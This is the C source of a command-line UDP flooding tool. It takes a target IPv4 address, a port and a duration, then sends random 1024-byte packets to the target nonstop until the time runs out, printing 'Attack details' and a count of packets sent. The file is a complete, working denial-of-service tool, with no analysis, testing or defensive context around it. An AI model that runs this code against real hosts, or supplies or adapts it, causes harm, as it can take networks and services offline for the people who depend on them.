#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <unistd.h>
#include <time.h>
#include <signal.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>

#include <stdint.h>

#define MAX_IPV4_LEN 15
#define PACKET_LEN 1024

#ifndef uint8_t
	typedef unsigned char uint8_t;
	typedef signed char   int8_t;
	typedef unsigned long int uint64_t;
#endif


struct CommandLineArguments {
	uint8_t     target_ip_chosen;
	uint8_t       port_no_chosen;
	uint8_t      duration_chosen;

	char target_ip[MAX_IPV4_LEN];
	int  		     port_no;
	int  		    duration;
};


int int_len(unsigned x);
void set_default_command_line_values(struct CommandLineArguments * __command_line_arguments);


int packets_sent = 0;
int sockfd;

void cleanup() {
	close(sockfd);
	printf("\n%d Total packets sent\n\n\033[?25h", packets_sent);
	exit(0);
}

void flood(char * __target_ip__, int __port__, int __duration__) {
	struct sockaddr_in server;
	server.sin_addr.s_addr = inet_addr(__target_ip__);
	server.sin_port        = htons(__port__);
	server.sin_family      = AF_INET;

	long cur_seconds = time(NULL), dur = cur_seconds + __duration__;
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	uint8_t packet[PACKET_LEN];

	for(int i = 0; i < PACKET_LEN; ++i) packet[i] = rand() % 255;

	signal(SIGINT, cleanup);

	while(cur_seconds < dur) {
/*int stat = */ sendto(sockfd, packet, PACKET_LEN, 0, (struct sockaddr*)&server, sizeof(server));
		packets_sent++;
		continue;

/*
		if(stat < 0) {
			break;
			perror("");
			cleanup();
		}
*/

	}
}

int main(int argc, char ** argv) {
	printf("\033[?25l");
	char * available_cmd_args[20][20] = {{"-T", "--target"},{"-P", "--port"},{"-D", "--duration"}};

	struct CommandLineArguments cmd_args;
	memset(&cmd_args, 0, sizeof(cmd_args));

	set_default_command_line_values(&cmd_args);

	for(int i = 0; i < argc; ++i) {
		int arg_index = i;
		if(!strcmp(argv[i], available_cmd_args[0][0]) || !strcmp(argv[i], available_cmd_args[0][1])) {
			arg_index++;
			strncpy(cmd_args.target_ip, argv[arg_index], MAX_IPV4_LEN);
			cmd_args.target_ip_chosen = 1;
		} else if(!strcmp(argv[i], available_cmd_args[1][0]) || !strcmp(argv[i], available_cmd_args[1][1])) {
			arg_index++;
			cmd_args.port_no = atoi(argv[arg_index]);
			cmd_args.port_no_chosen = 1;
		} else if(!strcmp(argv[i], available_cmd_args[2][0]) || !strcmp(argv[i], available_cmd_args[2][1])) {
			arg_index++;
			cmd_args.duration = atoi(argv[arg_index]);
			cmd_args.duration_chosen = 1;
		}
	}

	if(!cmd_args.target_ip_chosen) {
		printf("\nNeed a target IP(v4) Address\n");
		printf("Usage $ %s [-T/--target (TARGET IP) | -P/--port (PORT NUMBER) | -D/--duration (DURATION)]\n",argv[0]);
		printf("Usage $ %s --target 1.2.3.4 --port 4444 --duration 60\n\n\033[?25h",argv[0]);
		return -1;
	}

	printf("\nAttack details:\n\tIP: %22s\n\tPORT: %20d\n\tDURATION: %16d\n\n", cmd_args.target_ip, cmd_args.port_no, cmd_args.duration);
	sleep(1);

	fflush(stdout);

	flood(cmd_args.target_ip, cmd_args.port_no, cmd_args.duration);

	return 0;
}


int int_len(unsigned x) {
    if (x >= 1000000000) return 10;
    if (x >= 100000000)  return 9;
    if (x >= 10000000)   return 8;
    if (x >= 1000000)    return 7;
    if (x >= 100000)     return 6;
    if (x >= 10000)      return 5;
    if (x >= 1000)       return 4;
    if (x >= 100)        return 3;
    if (x >= 10)         return 2;
    return 1;
}

void set_default_command_line_values(struct CommandLineArguments * __command_line_arguments__) {
	__command_line_arguments__->target_ip_chosen =    0;
	__command_line_arguments__->port_no_chosen   =    0;
	__command_line_arguments__->duration_chosen  =    0;
	__command_line_arguments__->port_no 	     = 4444;
	__command_line_arguments__->duration	     =   60;

	return;
}
